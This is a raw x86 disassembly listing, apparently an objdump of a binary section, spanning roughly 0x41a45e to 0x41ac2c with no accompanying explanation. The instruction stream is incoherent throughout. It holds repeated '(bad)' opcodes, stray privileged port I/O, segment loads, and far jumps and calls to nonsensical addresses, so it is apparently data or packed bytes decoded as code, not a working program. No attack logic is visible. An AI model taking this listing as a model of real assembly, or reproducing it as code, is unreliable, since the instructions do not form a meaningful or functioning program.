  41a45e:	pop    ebx
  41a45f:	mov    ch,0x5e
  41a461:	sbb    eax,0x35ec657e
  41a466:	jae    0x41a3f7
  41a468:	in     eax,0xe3
  41a46a:	dec    ecx
  41a46b:	ror    DWORD PTR [edx],0x80
  41a46e:	in     eax,dx
  41a46f:	jge    0x41a419
  41a471:	lock popf 
  41a473:	cmp    esi,DWORD PTR ds:0x6d8dc91
  41a479:	mov    ds,WORD PTR [esp+ebp*1]
  41a47c:	test   DWORD PTR [ebp-0x37],0x30deb1d7
  41a483:	ret    
  41a484:	adc    eax,0x1ef2cec3
  41a489:	retf   0xcec4
  41a48c:	mov    ecx,0x66d81f7
  41a491:	mov    fs,WORD PTR [ebp+0xfb238bc]
  41a497:	pop    es
  41a498:	pusha  
  41a499:	addr16 pop ss
  41a49b:	dec    ecx
  41a49c:	(bad)  
  41a49d:	xlat   BYTE PTR ds:[ebx]
  41a49e:	inc    edx
  41a49f:	mov    cl,0xbb
  41a4a1:	sti    
  41a4a2:	cmp    BYTE PTR [ecx+0x91a5900],0xde
  41a4a9:	std    
  41a4aa:	mov    edi,0xcb88b87
  41a4af:	fisttp QWORD PTR [ebx+0x45]
  41a4b2:	(bad)  
  41a4b3:	adc    al,0x1a
  41a4b5:	inc    ebp
  41a4b6:	adc    ah,bl
  41a4b8:	jno    0x41a4e3
  41a4ba:	jbe    0x41a4ee
  41a4bc:	call   0x8d56513f
  41a4c1:	(bad)
  41a4c4:	(bad)  
  41a4c5:	pop    dx
  41a4c7:	mov    esp,DWORD PTR [ebx]
  41a4c9:	sbb    esp,DWORD PTR [esi-0x594b9151]
  41a4cf:	jmp    0xc63b:0xaf797299
  41a4d6:	cmp    bl,BYTE PTR ds:0x6832fb54
  41a4dc:	rcr    DWORD PTR [edx+0x74],cl
  41a4df:	adc    BYTE PTR [edi+0x25],0xf
  41a4e3:	iret   
  41a4e4:	mov    ds:0x4572cf64,eax
  41a4e9:	dec    eax
  41a4ea:	test   al,0x68
  41a4ec:	jle    0x41a506
  41a4ee:	loopne 0x41a47b
  41a4f0:	(bad)  
  41a4f1:	(bad)  
  41a4f2:	ss mov dh,0xbc
  41a4f5:	sbb    bh,ah
  41a4f7:	cmp    eax,0xdc689b09
  41a4fc:	in     eax,0xec
  41a4fe:	xor    BYTE PTR [ebx],bl
  41a500:	int3   
  41a501:	cmp    esp,DWORD PTR [ebx-0x27]
  41a504:	std    
  41a505:	leave  
  41a506:	out    dx,eax
  41a507:	repnz push 0x2f4f31b4
  41a50d:	sahf   
  41a50e:	mov    al,BYTE PTR ss:[eax+0x2e]
  41a512:	cmp    dh,BYTE PTR [ecx]
  41a514:	cmp    dl,BYTE PTR [esi-0x500efa0c]
  41a51a:	cs daa 
  41a51c:	pop    edx
  41a51d:	xchg   ecx,eax
  41a51e:	jp     0x41a521
  41a520:	lods   al,BYTE PTR ds:[esi]
  41a521:	ret    0x1c49
  41a524:	les    edx,FWORD PTR [edx-0x36]
  41a527:	mov    ah,0xa3
  41a529:	rcr    DWORD PTR fs:[edx-0x4],0x35
  41a52e:	pop    es
  41a52f:	jg     0x41a4cc
  41a531:	pcmpgtb mm6,QWORD PTR [esi]
  41a534:	clc    
  41a535:	stos   DWORD PTR es:[edi],eax
  41a536:	fisttp DWORD PTR [esi-0x5d]
  41a539:	shl    BYTE PTR [ebx],0xca
  41a53c:	cmc    
  41a53d:	dec    esp
  41a53e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a53f:	fsubr  DWORD PTR ds:0x8d755cb4
  41a545:	or     eax,0xb4175c15
  41a54a:	(bad)  
  41a54b:	adc    DWORD PTR [eax+esi*8+0x8],esi
  41a54f:	and    al,0x7c
  41a551:	into   
  41a552:	icebp  
  41a553:	cmp    DWORD PTR [ebp+ebp*1-0x26],esi
  41a557:	add    eax,0x8999273d
  41a55c:	xor    eax,0xc9c15bc2
  41a561:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a562:	test   DWORD PTR [ebp-0x15159837],0x83172721
  41a56c:	sub    ecx,DWORD PTR [edx+0x2a]
  41a56f:	(bad)  
  41a570:	dec    ebx
  41a571:	sub    cl,BYTE PTR ds:0xe7ca7dd9
  41a577:	repnz adc DWORD PTR [eax+0x76],edx
  41a57b:	add    BYTE PTR [ebp+0x6496fc2],0xf9
  41a582:	pop    edi
  41a583:	and    DWORD PTR [si-0x6709],ebx
  41a588:	test   DWORD PTR [edi],0xd0a63616
  41a58e:	and    cl,BYTE PTR [edi+ebx*8+0x3790db3b]
  41a595:	ss out 0x5c,al
  41a598:	lds    ebp,FWORD PTR [ecx-0x31]
  41a59b:	adc    cl,BYTE PTR ds:0xa735ed48
  41a5a1:	fld    QWORD PTR [ebx+0xd]
  41a5a4:	or     dl,dl
  41a5a6:	pop    eax
  41a5a7:	scas   al,BYTE PTR es:[edi]
  41a5a8:	jnp    0x41a54d
  41a5aa:	sbb    esi,esi
  41a5ac:	pop    ecx
  41a5ad:	out    dx,eax
  41a5ae:	fiadd  DWORD PTR [edx]
  41a5b0:	mov    al,0xe0
  41a5b2:	adc    ecx,esp
  41a5b4:	cmp    ah,BYTE PTR [edi+esi*4]
  41a5b7:	lahf   
  41a5b8:	push   cs
  41a5b9:	or     ebx,DWORD PTR [edi]
  41a5bb:	in     eax,dx
  41a5bc:	inc    ebp
  41a5bd:	mov    esi,edi
  41a5bf:	js     0x41a56b
  41a5c1:	es xchg esp,eax
  41a5c3:	adc    al,0x26
  41a5c5:	sub    ebx,ecx
  41a5c7:	mov    al,ds:0x1c775d94
  41a5cc:	outs   dx,BYTE PTR ds:[esi]
  41a5cd:	mov    esp,0x8eb63702
  41a5d2:	cli    
  41a5d3:	js     0x41a63d
  41a5d5:	lods   al,BYTE PTR ds:[esi]
  41a5d6:	test   BYTE PTR [ecx-0x197b003f],cl
  41a5dc:	sbb    BYTE PTR [ebx-0x29a4d61f],ch
  41a5e2:	fild   QWORD PTR ds:0x9d6217e7
  41a5e8:	sub    edx,DWORD PTR [ebx+0x2c6f1aca]
  41a5ee:	retf   
  41a5ef:	sbb    esp,edx
  41a5f1:	fild   DWORD PTR [ebp+0x77625cbc]
  41a5f7:	sub    al,0x82
  41a5f9:	cli    
  41a5fa:	jmp    0x41a650
  41a5fc:	frstor [eax+0x1c]
  41a5ff:	out    dx,al
  41a600:	fnsave [edx-0x5014a4f7]
  41a606:	push   ecx
  41a607:	jl     0x41a5b8
  41a609:	adc    eax,0x36159529
  41a60e:	int    0x89
  41a610:	into   
  41a611:	sub    dh,BYTE PTR [eax+edx*2-0x3673b4e1]
  41a618:	jb     0x41a63d
  41a61a:	sub    ah,BYTE PTR [ebx-0x2c59c06a]
  41a620:	pop    esi
  41a621:	xor    eax,0x52aff51
  41a626:	test   BYTE PTR [edx+0x7f],al
  41a629:	mov    DWORD PTR es:[ecx+0x50f986c2],esp
  41a630:	or     edi,edx
  41a632:	enter  0x3b32,0x6a
  41a636:	popa   
  41a637:	xchg   ebx,eax
  41a638:	or     edx,DWORD PTR [edi+0x508cdb2e]
  41a63e:	pushf  
  41a63f:	add    dh,BYTE PTR [eax+0x5e]
  41a642:	call   0xb9901141
  41a647:	pop    ss
  41a648:	mov    bh,0x1a
  41a64a:	cli    
  41a64b:	leave  
  41a64c:	fist   WORD PTR [ebx+edx*1+0x6acc2076]
  41a653:	(bad)  
  41a654:	xchg   edi,eax
  41a655:	mov    al,ds:0x840637d0
  41a65a:	mov    cl,0x2f
  41a65c:	inc    edx
  41a65d:	sub    al,BYTE PTR [ebp+0x51]
  41a660:	sub    eax,0x2d5dd6ca
  41a665:	imul   ecx
  41a667:	in     eax,dx
  41a668:	test   eax,0xef15b16e
  41a66d:	mov    esp,0x571c723f
  41a672:	lds    eax,FWORD PTR [eax-0x284f459d]
  41a678:	xor    eax,0xaf17499c
  41a67d:	xor    BYTE PTR [ecx],ah
  41a67f:	sub    BYTE PTR [ebx],ah
  41a681:	mov    WORD PTR [edx+0x6c56a1af],ds
  41a687:	jb     0x41a642
  41a689:	sbb    eax,0x831c9407
  41a68e:	pop    es
  41a68f:	and    DWORD PTR [ecx],0x4f8f5327
  41a695:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a696:	stc    
  41a697:	leave  
  41a698:	adc    ah,BYTE PTR [eax-0xac4baf9]
  41a69e:	push   ebx
  41a69f:	in     al,0x94
  41a6a1:	mov    ebx,0x9ae13929
  41a6a6:	out    0x97,al
  41a6a8:	leave  
  41a6a9:	aam    0xc6
  41a6ab:	mov    edi,0x32d29757
  41a6b0:	arpl   WORD PTR [ebx+0x54],bp
  41a6b3:	sub    esi,DWORD PTR [esi]
  41a6b5:	mov    edi,0xc1cf5e19
  41a6ba:	add    DWORD PTR [eax-0x40],edi
  41a6bd:	xchg   esi,eax
  41a6be:	xor    ecx,esi
  41a6c0:	fst    DWORD PTR [esi-0x1a6edae1]
  41a6c6:	pop    esi
  41a6c7:	mov    bh,0x27
  41a6c9:	jecxz  0x41a744
  41a6cb:	iret   
  41a6cc:	pop    ebx
  41a6cd:	jb     0x41a703
  41a6cf:	jle    0x41a6ad
  41a6d1:	jecxz  0x41a70e
  41a6d3:	sbb    bl,cl
  41a6d5:	xchg   edi,eax
  41a6d6:	aad    0x9
  41a6d8:	lock jp 0x41a6c4
  41a6db:	mov    ?,WORD PTR [eax+0x5e170d81]
  41a6e1:	dec    ebp
  41a6e2:	ins    BYTE PTR es:[edi],dx
  41a6e3:	popa   
  41a6e4:	dec    edx
  41a6e5:	or     ebx,DWORD PTR [ebx-0x1f]
  41a6e8:	push   esi
  41a6e9:	stos   BYTE PTR es:[edi],al
  41a6ea:	mov    al,0x99
  41a6ec:	push   edi
  41a6ed:	add    eax,DWORD PTR [ebx-0x77]
  41a6f0:	vpmacswd xmm2,xmm7,XMMWORD PTR [edi-0x6e],xmm0
  41a6f7:	mov    bl,BYTE PTR ds:0x4badce8c
  41a6fd:	mov    al,ds:0x15c3f726
  41a702:	dec    edi
  41a703:	data16 jno 0x41a6ff
  41a706:	sar    DWORD PTR [edx],1
  41a708:	scas   al,BYTE PTR es:[edi]
  41a709:	mov    dh,0xf2
  41a70b:	sbb    ecx,eax
  41a70d:	cmp    eax,0xfdb51ab4
  41a712:	xchg   ebx,eax
  41a713:	mov    bl,0x92
  41a715:	ins    DWORD PTR es:[edi],dx
  41a716:	leave  
  41a717:	into   
  41a718:	jl     0x41a72b
  41a71a:	mov    edi,0x55fe4ab5
  41a71f:	mov    ds:0x919c849b,eax
  41a724:	jae    0x41a6ce
  41a726:	pop    ebx
  41a727:	imul   edi,DWORD PTR [ebx-0x5cb5c3a2],0x14
  41a72e:	popf   
  41a72f:	les    eax,FWORD PTR [edi]
  41a731:	lock mov ebx,0xf36f3884
  41a737:	xor    BYTE PTR [esi],cl
  41a739:	jge    0x41a799
  41a73b:	jecxz  0x41a730
  41a73d:	xchg   ebp,eax
  41a73e:	scas   al,BYTE PTR es:[edi]
  41a73f:	inc    esp
  41a740:	retf   
  41a741:	push   cs
  41a742:	call   FWORD PTR [ebp+ebx*2-0x5192cca]
  41a749:	sbb    edi,0x32c68be8
  41a74f:	add    DWORD PTR [edi],ebp
  41a751:	adc    al,0xa0
  41a753:	or     DWORD PTR [ebx],esi
  41a755:	mov    bh,0xf7
  41a757:	sub    DWORD PTR ds:0x3afc2d71,0x23
  41a75e:	dec    edi
  41a75f:	fwait
  41a760:	sbb    al,0xa0
  41a762:	or     ch,dh
  41a764:	ds lock mov edx,0x28cad1d3
  41a76b:	jae    0x41a7a5
  41a76d:	xchg   esp,eax
  41a76e:	popf   
  41a76f:	dec    eax
  41a770:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a771:	pop    edx
  41a772:	shl    BYTE PTR [edi+0x57],cl
  41a775:	imul   ebp,ecx,0xffffff92
  41a778:	push   DWORD PTR [ebp+0x6c694ce3]
  41a77e:	mov    ah,0x5b
  41a780:	cdq    
  41a781:	and    DWORD PTR [edx-0x51fb05d6],ebp
  41a787:	jmp    0x41a741
  41a789:	mov    BYTE PTR [ebx-0x3b],dh
  41a78c:	add    DWORD PTR [edx+0x19],ebp
  41a78f:	imul   edi,DWORD PTR [esi+0x10],0xffffffca
  41a793:	sub    al,BYTE PTR [edx-0x5bb1c95f]
  41a799:	push   ebx
  41a79a:	push   eax
  41a79b:	cmc    
  41a79c:	cmp    cl,BYTE PTR [esi-0x17]
  41a79f:	gs mov dl,0xe5
  41a7a2:	in     al,dx
  41a7a3:	xchg   DWORD PTR [edi-0x2cbfaade],esp
  41a7a9:	mov    cl,0xa7
  41a7ab:	mov    ah,0xaa
  41a7ad:	push   ebx
  41a7ae:	mov    ch,0x49
  41a7b0:	xor    eax,0x3efb064c
  41a7b5:	push   0x9e0a0ebc
  41a7ba:	push   ds
  41a7bb:	pop    ebx
  41a7bc:	adc    dh,cl
  41a7be:	adc    esi,esp
  41a7c0:	xchg   esp,eax
  41a7c1:	xor    edi,DWORD PTR [edi-0x7cc4dd34]
  41a7c7:	test   BYTE PTR [edi],al
  41a7c9:	in     eax,0x89
  41a7cb:	jmp    0x41a837
  41a7cd:	or     DWORD PTR [edi-0x2d9dd8cb],edi
  41a7d3:	xchg   ebp,eax
  41a7d4:	push   ds
  41a7d5:	push   ds
  41a7d6:	jno    0x41a82b
  41a7d8:	adc    BYTE PTR [ebx+0x2d],cl
  41a7db:	mov    ch,0xcb
  41a7dd:	or     eax,0x1eb5aeea
  41a7e2:	call   0xcf1ef5ca
  41a7e7:	jge    0x41a817
  41a7e9:	xor    ah,BYTE PTR [edx+0x5a]
  41a7ec:	add    eax,0xe3d0257d
  41a7f1:	pop    ebx
  41a7f2:	fiadd  DWORD PTR [eax+0x64]
  41a7f5:	lock test ebp,0xf511678c
  41a7fc:	ins    DWORD PTR es:[edi],dx
  41a7fd:	mov    eax,ds:0x6c05526d
  41a802:	imul   ebx,DWORD PTR [edi],0xfffffff6
  41a805:	adc    eax,0x87a7970
  41a80a:	and    ecx,DWORD PTR [edx+0x4f]
  41a80d:	in     al,0xbf
  41a80f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a810:	mov    ss,WORD PTR [edx+edi*2]
  41a813:	scas   al,BYTE PTR es:[edi]
  41a814:	push   ss
  41a815:	das    
  41a816:	rcr    DWORD PTR [eax-0x1ad02b84],cl
  41a81c:	push   0x39154d27
  41a821:	xor    eax,0xfa0f4b6b
  41a826:	adc    BYTE PTR [edi+0x41],bh
  41a829:	sbb    eax,0x8ddd0dff
  41a82e:	and    eax,0x9d4790ba
  41a833:	retf   
  41a834:	std    
  41a835:	jle    0x41a7d7
  41a837:	mov    ecx,0x8720727b
  41a83c:	ss fcmovnu st,st(2)
  41a83f:	mov    ebp,0x80f4da8c
  41a844:	fcomp  QWORD PTR [edi-0x6f]
  41a847:	clc    
  41a848:	out    0xda,eax
  41a84a:	bnd repz jnp 0x41a86d
  41a84e:	adc    BYTE PTR [edx-0x1652cb23],cl
  41a854:	dec    ecx
  41a855:	test   eax,0xc23eeb71
  41a85a:	inc    edi
  41a85b:	es sbb eax,0xc4748066
  41a861:	mov    DWORD PTR [esi+0x64869b00],ebx
  41a867:	add    cl,BYTE PTR [edi-0x29]
  41a86a:	fcomp  DWORD PTR [eax-0x1baab057]
  41a870:	or     BYTE PTR [edi+0x131bf0f4],al
  41a876:	jmp    0x5527:0x4d82f2cb
  41a87d:	aaa    
  41a87e:	xchg   edi,eax
  41a87f:	sbb    ax,0xf004
  41a883:	jo     0x41a8d1
  41a885:	mov    esp,0xbdcb65e4
  41a88a:	pop    edx
  41a88b:	dec    edi
  41a88c:	in     al,dx
  41a88d:	ins    BYTE PTR es:[edi],dx
  41a88e:	sbb    eax,0x6980bd2d
  41a893:	xor    DWORD PTR [esp+ebp*8+0x41],esi
  41a897:	mov    al,fs:0x543d9635
  41a89d:	sahf   
  41a89e:	jle    0x41a90c
  41a8a0:	add    esp,DWORD PTR [ebx+edi*1+0x46]
  41a8a4:	pop    es
  41a8a5:	cmp    al,BYTE PTR [edi]
  41a8a7:	popa   
  41a8a8:	sbb    dh,BYTE PTR [edi]
  41a8aa:	add    ebx,DWORD PTR [edi-0x5c]
  41a8ad:	push   0xeb32a559
  41a8b2:	les    esi,FWORD PTR [edi-0x2f7a5c80]
  41a8b8:	mov    al,ds:0x18606d40
  41a8bd:	pcmpgtw mm1,QWORD PTR [eax]
  41a8c0:	test   al,0x5
  41a8c2:	inc    esi
  41a8c3:	pop    ds
  41a8c4:	mov    ds:0x3ac4888b,al
  41a8c9:	dec    ebp
  41a8ca:	pop    ds
  41a8cb:	jecxz  0x41a8fd
  41a8cd:	sub    al,0xcc
  41a8cf:	push   cs
  41a8d0:	push   ebx
  41a8d1:	or     ebx,DWORD PTR [ecx]
  41a8d3:	leave  
  41a8d4:	jp     0x41a85e
  41a8d6:	repz jns 0x41a8b0
  41a8d9:	aad    0x6
  41a8db:	or     al,0x14
  41a8dd:	cmp    ch,ah
  41a8df:	fistp  DWORD PTR [ebx-0x107469a7]
  41a8e5:	and    al,0x98
  41a8e7:	lock pop ebp
  41a8e9:	shl    DWORD PTR [ebx],0xd3
  41a8ec:	mov    bl,0x4a
  41a8ee:	cli    
  41a8ef:	cmp    al,0xe
  41a8f1:	jne    0x41a956
  41a8f3:	pushw  cs
  41a8f5:	fiadd  DWORD PTR [edi+0x76d71183]
  41a8fb:	cmp    BYTE PTR [ebx-0x7e5861ac],0x59
  41a902:	jg     0x41a8e2
  41a904:	push   ebp
  41a905:	or     edx,esp
  41a907:	sbb    cl,BYTE PTR [eax+ebp*2+0x62703b9a]
  41a90e:	nop
  41a90f:	call   0x3f33:0x8ba3670d
  41a916:	clc    
  41a917:	pop    esi
  41a918:	ret    
  41a919:	cmp    bh,BYTE PTR [esi-0x1e]
  41a91c:	repz in eax,0xa7
  41a91f:	out    dx,al
  41a920:	addr16 sub ebp,eax
  41a923:	js     0x41a978
  41a925:	loopne 0x41a8b7
  41a927:	ins    DWORD PTR es:[edi],dx
  41a928:	inc    esi
  41a929:	int3   
  41a92a:	mov    bh,0xea
  41a92c:	frstor [ecx+0x7]
  41a92f:	pop    eax
  41a930:	lds    edi,FWORD PTR [ecx+0x4e2ee4f]
  41a936:	hlt    
  41a937:	pop    ds
  41a938:	mov    bl,0x33
  41a93a:	xor    al,0xef
  41a93c:	hlt    
  41a93d:	mov    esi,0xcc41f84a
  41a942:	xor    eax,0xbbf55a8a
  41a947:	mov    eax,ds:0xff0c22d2
  41a94c:	mov    ch,0xe4
  41a94e:	xchg   edx,eax
  41a94f:	xchg   ecx,eax
  41a950:	mov    esp,?
  41a952:	(bad)  
  41a953:	pushf  
  41a954:	jbe    0x41a947
  41a956:	sub    dl,BYTE PTR [ebx+0x67ca845d]
  41a95c:	push   edi
  41a95d:	retf   0xc18f
  41a960:	jae    0x41a9a0
  41a962:	cmc    
  41a963:	mov    esp,0xbffb156b
  41a968:	ds pop es
  41a96a:	rol    DWORD PTR [edx+0x18d48de0],0x1d
  41a971:	dec    esp
  41a972:	and    al,0x7b
  41a974:	cdq    
  41a975:	stos   DWORD PTR es:[edi],eax
  41a976:	jbe    0x41a947
  41a978:	xor    al,0xe4
  41a97a:	lods   eax,DWORD PTR ds:[esi]
  41a97b:	pop    ds
  41a97c:	xor    esp,DWORD PTR [eax+0x73019785]
  41a982:	inc    ebp
  41a983:	pop    eax
  41a984:	dec    edi
  41a985:	xor    eax,0x8afdb0a9
  41a98a:	arpl   WORD PTR [eax],ax
  41a98c:	mov    eax,fs:0x8e5a0dfc
  41a992:	inc    esi
  41a993:	fsub   QWORD PTR [ebx]
  41a995:	repz push ds
  41a997:	jmp    0x460a:0xb725a4f8
  41a99e:	pusha  
  41a99f:	pop    edi
  41a9a0:	jmp    0x41a9a5
  41a9a2:	cmp    al,dl
  41a9a4:	int    0x11
  41a9a6:	pop    esi
  41a9a7:	mov    ds:0x4cf8c99b,eax
  41a9ac:	rcr    BYTE PTR [eax-0x7c60747e],cl
  41a9b2:	sbb    DWORD PTR [eax-0x3d961145],0x548928e0
  41a9bc:	jbe    0x41aa04
  41a9be:	in     al,0x9
  41a9c0:	or     al,0xc
  41a9c2:	aad    0x4a
  41a9c4:	inc    eax
  41a9c5:	jnp    0x41a97a
  41a9c7:	and    BYTE PTR [ebp-0x6e4e5e07],0x29
  41a9ce:	jmp    0x1826:0x1a086cc8
  41a9d5:	push   cs
  41a9d6:	rcl    DWORD PTR [edi-0x6c93d341],1
  41a9dc:	mov    ?,WORD PTR [eax-0x12]
  41a9df:	xor    edi,DWORD PTR [edi-0x75d9d947]
  41a9e5:	cdq    
  41a9e6:	(bad)  
  41a9e7:	cmp    DWORD PTR [ecx],edi
  41a9e9:	sub    ecx,DWORD PTR [ecx+eax*2+0x33fe3832]
  41a9f0:	pop    esi
  41a9f1:	xor    ch,BYTE PTR [esi+0x1c84ff21]
  41a9f7:	pop    esp
  41a9f8:	jnp    0x41a986
  41a9fa:	fwait
  41a9fb:	cmp    eax,0xc4a4d903
  41aa00:	imul   edi,DWORD PTR [edx+ecx*8-0x18a1250c],0x5b2559ac
  41aa0b:	adc    eax,0x7f7c5c28
  41aa10:	mov    ebp,0xeb403c7b
  41aa15:	shl    bl,cl
  41aa17:	jae    0x41aa3b
  41aa19:	imul   ecx,DWORD PTR [ebp+0x31ed1dab],0xffffffba
  41aa20:	mov    ch,0x6a
  41aa22:	fdiv   st,st(1)
  41aa24:	ficom  DWORD PTR [edi+0x1b]
  41aa27:	dec    edi
  41aa28:	(bad)  
  41aa2a:	mov    bh,0x5d
  41aa2c:	cmp    BYTE PTR [ebp-0x18],cl
  41aa2f:	and    ah,BYTE PTR [ebp+esi*1+0x6d]
  41aa33:	xor    eax,0xa8bc5d15
  41aa38:	mov    DWORD PTR [eax-0x21],0x6e077539
  41aa3f:	sub    bh,ah
  41aa41:	push   ds
  41aa42:	fdiv   DWORD PTR [edi+0x33]
  41aa45:	clc    
  41aa46:	sub    DWORD PTR [eax],ebx
  41aa48:	mov    eax,ds:0xb945028f
  41aa4d:	test   al,0x74
  41aa4f:	aas    
  41aa50:	(bad)  
  41aa51:	cmp    al,0x2c
  41aa53:	loope  0x41aad3
  41aa55:	xchg   ecx,eax
  41aa56:	out    dx,al
  41aa57:	push   ebx
  41aa58:	xor    dl,BYTE PTR [esp+ecx*4-0x68ea7c48]
  41aa5f:	bound  ecx,QWORD PTR [ebx]
  41aa61:	pop    edi
  41aa62:	sub    DWORD PTR [esi-0x31],ebx
  41aa65:	push   ds
  41aa66:	add    cl,BYTE PTR [eax+0x2c2167b9]
  41aa6c:	and    al,0xdb
  41aa6e:	cmp    al,0xd8
  41aa70:	in     al,0xa8
  41aa72:	pop    ecx
  41aa73:	xor    al,0x6d
  41aa75:	test   al,0x94
  41aa77:	nop
  41aa78:	int    0xa7
  41aa7a:	dec    eax
  41aa7b:	into   
  41aa7c:	shl    DWORD PTR [eax+0x66799f94],cl
  41aa82:	loopne 0x41aad1
  41aa84:	cmc    
  41aa85:	daa    
  41aa86:	push   es
  41aa87:	push   0xffffffce
  41aa89:	call   0x67de:0x5a5a0b81
  41aa90:	in     eax,dx
  41aa91:	int    0xa9
  41aa93:	arpl   di,si
  41aa95:	inc    ebx
  41aa96:	sub    al,0xe9
  41aa98:	jp     0x41aae8
  41aa9a:	xor    BYTE PTR [esi+0x4c],cl
  41aa9d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aa9e:	add    DWORD PTR [eax],esp
  41aaa0:	mov    bh,0x1c
  41aaa2:	nop
  41aaa3:	cmp    eax,0x156b65c
  41aaa8:	dec    esp
  41aaa9:	jmp    0xb010:0xd1feb1a6
  41aab0:	div    BYTE PTR ds:0xc522a7f6
  41aab6:	addr16 fwait
  41aab8:	cld    
  41aab9:	push   ss
  41aaba:	inc    edi
  41aabb:	jg     0x41aa5f
  41aabd:	mov    esp,0xe5f5386c
  41aac2:	dec    ecx
  41aac3:	xchg   esp,eax
  41aac5:	adc    al,0x6e
  41aac7:	and    BYTE PTR [edx+0x67ed4a7b],al
  41aacd:	fistp  WORD PTR [ecx]
  41aacf:	xor    cl,al
  41aad1:	(bad)  
  41aad2:	push   ds
  41aad3:	sbb    ah,BYTE PTR [ebx]
  41aad5:	repz push eax
  41aad7:	in     eax,0x13
  41aad9:	mov    esp,edx
  41aadb:	aas    
  41aadc:	adc    ebp,edi
  41aade:	cdq    
  41aadf:	(bad)
  41aae2:	xor    ah,ch
  41aae4:	in     al,0x4d
  41aae6:	mov    ah,0xf1
  41aae8:	mov    dh,0xe9
  41aaea:	dec    ebx
  41aaeb:	mov    dh,0x60
  41aaed:	adc    eax,0x8946f546
  41aaf2:	or     ch,dl
  41aaf4:	out    dx,al
  41aaf5:	inc    ebp
  41aaf6:	jbe    0x41aa7f
  41aaf8:	call   0xda6d6a17
  41aafd:	dec    edx
  41aafe:	stc    
  41aaff:	vaddss xmm2,xmm4,DWORD PTR [ebp+0x40]
  41ab04:	dec    ebp
  41ab05:	repnz loope 0x41aace
  41ab08:	fnstcw WORD PTR [edx]
  41ab0a:	mov    dh,0x2f
  41ab0c:	sub    al,0x7d
  41ab0e:	test   ecx,ebx
  41ab10:	xor    al,0x1
  41ab12:	inc    ebp
  41ab13:	xchg   edx,eax
  41ab14:	dec    ebx
  41ab15:	imul   ecx,DWORD PTR [ebx+0x1de99566],0xf9f64ae6
  41ab1f:	jge    0x41ab85
  41ab21:	mov    BYTE PTR [ebp+0x4],ch
  41ab24:	xor    bh,cl
  41ab26:	es xor dl,ah
  41ab29:	dec    eax
  41ab2a:	sub    eax,0x9d9a845e
  41ab2f:	icebp  
  41ab30:	mov    WORD PTR [ebx-0x38],ds
  41ab33:	jecxz  0x41ab2c
  41ab35:	in     eax,0xf2
  41ab37:	jge    0x41aba2
  41ab39:	sar    ecx,0x35
  41ab3c:	push   eax
  41ab3d:	xor    al,BYTE PTR [esi+edi*2]
  41ab40:	add    al,0x2c
  41ab42:	adc    eax,0xd8711084
  41ab47:	xchg   esi,eax
  41ab48:	jp     0x41aaec
  41ab4a:	fs xor al,0x5f
  41ab4d:	cdq    
  41ab4e:	inc    edx
  41ab4f:	dec    eax
  41ab50:	cmp    bh,BYTE PTR [eax+0x469b633b]
  41ab56:	call   0xd2229b02
  41ab5b:	xor    al,0x29
  41ab5d:	adc    DWORD PTR [edx],ebp
  41ab5f:	cmp    DWORD PTR [edx],0xf5327e10
  41ab65:	dec    ebx
  41ab66:	push   eax
  41ab67:	mov    eax,ds:0xd8b3c074
  41ab6c:	outs   dx,DWORD PTR ds:[esi]
  41ab6d:	and    al,0xfe
  41ab6f:	shr    BYTE PTR [esi-0x1d83f719],1
  41ab75:	lods   eax,DWORD PTR ds:[esi]
  41ab76:	push   esi
  41ab77:	popa   
  41ab78:	sti    
  41ab79:	pop    ebx
  41ab7a:	xor    ch,cl
  41ab7c:	in     al,0xb7
  41ab7e:	add    bl,0xef
  41ab81:	lea    edx,[edi]
  41ab83:	lds    ebx,FWORD PTR [ecx-0x2e]
  41ab86:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ab87:	fsubr  DWORD PTR [ecx-0x5054396]
  41ab8d:	dec    ebx
  41ab8e:	xor    eax,0xd0d857f6
  41ab93:	popf   
  41ab94:	cmp    al,BYTE PTR [edx]
  41ab96:	add    bl,BYTE PTR [ebx-0x64]
  41ab99:	enter  0x5b9f,0x34
  41ab9d:	and    ebp,DWORD PTR [esp+ecx*2+0x1a016576]
  41aba4:	inc    ebx
  41aba5:	sub    eax,0x4a0ae617
  41abaa:	mov    ds:0x4ad3e1c7,al
  41abaf:	into   
  41abb0:	inc    edx
  41abb1:	rcl    BYTE PTR [edx],0xd9
  41abb4:	cmp    BYTE PTR [edi+0x1e],dl
  41abb7:	sbb    DWORD PTR [edx],eax
  41abb9:	outs   dx,BYTE PTR ds:[esi]
  41abba:	mov    BYTE PTR [edi-0x5e],dh
  41abbd:	scas   eax,DWORD PTR es:[edi]
  41abbe:	jle    0x41abc4
  41abc0:	xchg   edi,eax
  41abc1:	test   BYTE PTR [edi+0xecdeb0d],0xf2
  41abc8:	(bad)  
  41abc9:	inc    edx
  41abca:	sbb    eax,0xd65f36d6
  41abcf:	sbb    eax,0x5bf8d59e
  41abd4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41abd5:	mov    al,ds:0x3590066b
  41abda:	in     eax,0xd
  41abdc:	call   0xfdd3:0x87cc2467
  41abe3:	push   ss
  41abe4:	xchg   edi,eax
  41abe5:	rol    DWORD PTR [esi+0x19],0xca
  41abe9:	xchg   esi,eax
  41abea:	push   esp
  41abeb:	scas   al,BYTE PTR es:[edi]
  41abec:	xor    BYTE PTR [edx+0x1c9e61fb],cl
  41abf2:	jge    0x41ac68
  41abf4:	adc    eax,0x223bf4f
  41abf9:	lods   al,BYTE PTR ds:[esi]
  41abfa:	cld    
  41abfb:	cmp    ebx,DWORD PTR [esi+0x70459ce5]
  41ac01:	imul   ebp,DWORD PTR [esi],0x4371b206
  41ac07:	mov    esp,0xe81dad69
  41ac0c:	imul   esp,DWORD PTR [ebx],0x819c3747
  41ac12:	mov    cl,0x3c
  41ac14:	enter  0x9dd5,0x11
  41ac18:	push   esp
  41ac19:	push   eax
  41ac1a:	in     eax,0x39
  41ac1c:	sahf   
  41ac1d:	test   ah,0x5b
  41ac20:	jg     0x41abfd
  41ac22:	outs   dx,BYTE PTR ds:[esi]
  41ac23:	or     BYTE PTR [ebx],0x1b
  41ac26:	jge    0x41ac68
  41ac28:	jmp    0x41ac86
  41ac2a:	(bad)  
  41ac2b:	push   edi
  41ac2c:	xlat   BYTE PTR ds:[ebx]
